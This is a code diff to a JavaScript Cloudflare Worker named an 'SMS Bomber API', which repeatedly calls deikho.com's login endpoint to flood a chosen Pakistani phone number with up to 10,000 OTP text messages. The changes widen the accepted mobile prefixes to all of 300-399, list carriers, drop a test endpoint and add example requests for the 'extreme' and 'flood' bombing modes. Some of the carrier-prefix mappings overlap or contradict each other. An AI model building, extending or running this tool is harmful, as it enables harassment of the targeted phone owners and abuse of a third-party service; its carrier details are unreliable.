@@ -1,4 +1,4 @@
-// SMS Bomber API using deikho.com ONLY for Pakistan
+// SMS Bomber API using deikho.com ONLY for ALL Pakistan Numbers
 addEventListener('fetch', event => {
   event.respondWith(handleRequest(event.request));
 });
@@ -27,7 +27,7 @@ async function handleRequest(request) {
       JSON.stringify({
         status: 'error',
         message: 'Phone parameter is required',
-        example: '/?phone=923001234567&qty=100&mode=fast'
+        example: '/?phone=923271234567&qty=100&mode=fast'
       }, null, 2),
       { status: 400, headers: corsHeaders }
     );
@@ -49,7 +49,15 @@ async function handleRequest(request) {
     return new Response(
       JSON.stringify({
         status: 'error',
-        message: 'Invalid Pakistan phone number. Use format: 923001234567 or 03001234567'
+        message: 'Invalid Pakistan phone number',
+        valid_formats: [
+          '923001234567',
+          '03001234567', 
+          '3001234567',
+          '03271234567',
+          '3211234567'
+        ],
+        valid_prefixes: '0300-0399, 92300-92399'
       }, null, 2),
       { status: 400, headers: corsHeaders }
     );
@@ -111,40 +119,52 @@ async function handleRequest(request) {
   }
 }
 
-// Format Pakistan phone number
+// Format Pakistan phone number - ACCEPTS ALL PAKISTAN NUMBERS
 function formatPakistanPhone(phone) {
   // Remove all non-digits
   let cleaned = phone.replace(/\D/g, '');
   
-  // Check if it's a valid Pakistan number
+  // Check minimum and maximum length
   if (cleaned.length < 10 || cleaned.length > 12) {
     return null;
   }
   
-  // If it starts with 0 (like 03001234567)
+  // Case 1: Starts with 0 (like 03271234567, 03001234567, etc.)
   if (cleaned.startsWith('0')) {
-    cleaned = '92' + cleaned.substring(1);
+    // Check if it's a valid Pakistan mobile number after 0
+    const afterZero = cleaned.substring(1, 4); // Get next 3 digits
+    const prefix = parseInt(afterZero);
+    
+    // ALL Pakistan mobile prefixes 300-399
+    if (prefix >= 300 && prefix <= 399) {
+      return '92' + cleaned.substring(1);
+    }
+    return null;
   }
   
-  // If it's 10 digits (like 3001234567)
+  // Case 2: 10 digits (like 3271234567, 3001234567)
   if (cleaned.length === 10) {
-    cleaned = '92' + cleaned;
-  }
-  
-  // Ensure it starts with 92 and has correct length
-  if (!cleaned.startsWith('92') || cleaned.length !== 12) {
+    const prefix = parseInt(cleaned.substring(0, 3));
+    // ALL Pakistan mobile prefixes 300-399
+    if (prefix >= 300 && prefix <= 399) {
+      return '92' + cleaned;
+    }
     return null;
   }
   
-  // Check Pakistan mobile prefixes
-  const prefixes = ['92300', '92301', '92302', '92303', '92304', '92305', '92306', '92307', '92308', '92309', '92310', '92311', '92312', '92313', '92314', '92315'];
-  const isValidPrefix = prefixes.some(prefix => cleaned.startsWith(prefix));
-  
-  if (!isValidPrefix) {
+  // Case 3: 12 digits starting with 92 (like 923271234567)
+  if (cleaned.length === 12 && cleaned.startsWith('92')) {
+    const after92 = cleaned.substring(2, 5); // Get digits after 92
+    const prefix = parseInt(after92);
+    
+    // ALL Pakistan mobile prefixes 300-399
+    if (prefix >= 300 && prefix <= 399) {
+      return cleaned;
+    }
     return null;
   }
   
-  return cleaned;
+  return null;
 }
 
 // Normal bombing mode
@@ -399,28 +419,62 @@ async function floodModeDeikho(phone, quantity) {
 // Health check endpoint
 async function handleHealthRequest() {
   try {
-    const testPhone = '923001234567';
-    const DEIKHO_API = `https://deikho.com/login?phone=${testPhone}`;
+    // Test with different Pakistan prefixes
+    const testNumbers = [
+      '923271234567', // Jazz
+      '923351234567', // Zong
+      '923451234567', // Telenor
+      '923001234567'  // Ufone
+    ];
     
-    const response = await fetch(DEIKHO_API, {
-      headers: {
-        'User-Agent': 'Health-Check/1.0'
+    let working = false;
+    let testedNumber = '';
+    
+    for (const testNum of testNumbers) {
+      try {
+        const DEIKHO_API = `https://deikho.com/login?phone=${testNum}`;
+        const response = await fetch(DEIKHO_API, {
+          headers: { 'User-Agent': 'Health-Check/1.0' }
+        });
+        
+        if (response.ok) {
+          working = true;
+          testedNumber = testNum;
+          break;
+        }
+      } catch (e) {
+        continue;
       }
-    });
+    }
     
     return new Response(JSON.stringify({
       status: 'online',
-      service: 'Deikho.com SMS Bomber - Pakistan Only',
-      version: '1.0',
-      api_endpoint: 'https://deikho.com/login?phone=',
-      deikho_status: response.ok ? 'working' : 'down',
+      service: 'Deikho.com SMS Bomber - All Pakistan Numbers',
+      version: '2.0',
+      deikho_status: working ? 'working' : 'maybe_down',
+      tested_with: testedNumber || 'none',
+      
+      // All Pakistan networks support
+      supported_prefixes: {
+        jazz: '0300-0309, 0310-0319, 0320-0329',
+        telenor: '0340-0349',
+        zong: '0310-0319, 0330-0339',
+        ufone: '0330-0339',
+        special: '0370-0379',
+        all_formats: '300-399 (all Pakistan mobile)'
+      },
+      
       limits: {
         max_messages: 10000,
-        modes: ['normal', 'fast', 'extreme', 'flood'],
-        supported_formats: ['923001234567', '03001234567', '3001234567']
+        modes: ['normal', 'fast', 'extreme', 'flood']
       },
-      usage: '/?phone=PHONE&qty=QUANTITY&mode=MODE',
-      example: '/?phone=3001234567&qty=100&mode=fast',
+      
+      usage_examples: [
+        '/?phone=03271234567&qty=100&mode=fast',
+        '/?phone=923351234567&qty=500&mode=extreme',
+        '/?phone=3451234567&qty=50&mode=normal'
+      ],
+      
       timestamp: new Date().toISOString()
     }, null, 2), {
       headers: {
@@ -440,48 +494,6 @@ async function handleHealthRequest() {
   }
 }
 
-// Test endpoint
-async function handleTestRequest(phone) {
-  try {
-    const formattedPhone = formatPakistanPhone(phone);
-    if (!formattedPhone) {
-      return new Response(JSON.stringify({
-        test: 'failed',
-        message: 'Invalid Pakistan phone number'
-      }, null, 2), {
-        status: 400,
-        headers: { 'Content-Type': 'application/json' }
-      });
-    }
-    
-    const DEIKHO_API = `https://deikho.com/login?phone=${formattedPhone}`;
-    const response = await fetch(DEIKHO_API);
-    
-    return new Response(JSON.stringify({
-      test: 'success',
-      original_phone: phone,
-      formatted_phone: formattedPhone,
-      api: 'deikho.com',
-      status: response.status,
-      working: response.ok,
-      valid_pakistan_number: true
-    }, null, 2), {
-      headers: {
-        'Content-Type': 'application/json',
-        'Access-Control-Allow-Origin': '*'
-      }
-    });
-  } catch (error) {
-    return new Response(JSON.stringify({
-      test: 'failed',
-      error: error.message
-    }, null, 2), {
-      status: 500,
-      headers: { 'Content-Type': 'application/json' }
-    });
-  }
-}
-
 // Main fetch handler
 addEventListener('fetch', event => {
   const url = new URL(event.request.url);
@@ -492,39 +504,53 @@ addEventListener('fetch', event => {
     return;
   }
   
-  // Test endpoint
-  if (url.pathname === '/test') {
-    const testPhone = url.searchParams.get('phone') || '923001234567';
-    event.respondWith(handleTestRequest(testPhone));
-    return;
-  }
-  
   // API info endpoint
   if (url.pathname === '/info' || url.pathname === '/') {
     event.respondWith(new Response(JSON.stringify({
-      api_name: 'Deikho.com SMS Bomber - Pakistan',
-      description: 'SMS bombing API using deikho.com for Pakistan numbers only',
+      api_name: 'Deikho.com SMS Bomber - All Pakistan Numbers',
+      description: 'Supports ALL Pakistan mobile numbers (300-399 prefixes)',
+      
       endpoints: {
         main: '/?phone=PHONE&qty=QUANTITY&mode=MODE',
         health: '/health',
-        test: '/test?phone=PHONE'
+        info: '/info'
       },
-      phone_formats: [
-        '923001234567 (With country code)',
-        '03001234567 (With leading zero)',
-        '3001234567 (Without country code)'
+      
+      // ACCEPTS ALL THESE FORMATS:
+      accepted_formats: [
+        '923001234567',    // With 92
+        '923271234567',    // Jazz
+        '923451234567',    // Telenor
+        '03001234567',     // With 0
+        '03271234567',     // Jazz with 0
+        '03451234567',     // Telenor with 0
+        '3001234567',      // Without prefix
+        '3271234567',      // Jazz without prefix
+        '3451234567'       // Telenor without prefix
       ],
-      valid_prefixes: [
-        '92300', '92301', '92302', '92303', '92304',
-        '92305', '92306', '92307', '92308', '92309',
-        '92310', '92311', '92312', '92313', '92314', '92315'
-      ],
-      modes: {
-        normal: 'Sequential requests with 100ms delay',
-        fast: 'Concurrent batches (5x faster)',
-        extreme: 'Maximum concurrent requests',
-        flood: 'Continuous bombing for 30 seconds'
-      }
+      
+      // ALL PAKISTAN NETWORKS:
+      pakistan_networks: {
+        jazz: ['0300-0309', '0310-0319', '0320-0329'],
+        telenor: ['0340-0349'],
+        zong: ['0310-0319', '0330-0339'],
+        ufone: ['0330-0339'],
+        special_new: ['0370-0379'],
+        note: 'ALL numbers from 300-399 are accepted'
+      },
+      
+      bombing_modes: {
+        normal: 'Sequential (100ms delay)',
+        fast: 'Concurrent batches',
+        extreme: 'Maximum speed',
+        flood: '30 seconds continuous'
+      },
+      
+      example_requests: [
+        'https://your-worker.workers.dev/?phone=03271234567&qty=100',
+        'https://your-worker.workers.dev/?phone=923351234567&qty=500&mode=extreme',
+        'https://your-worker.workers.dev/?phone=3451234567&qty=50&mode=flood'
+      ]
     }, null, 2), {
       headers: {
         'Content-Type': 'application/json',
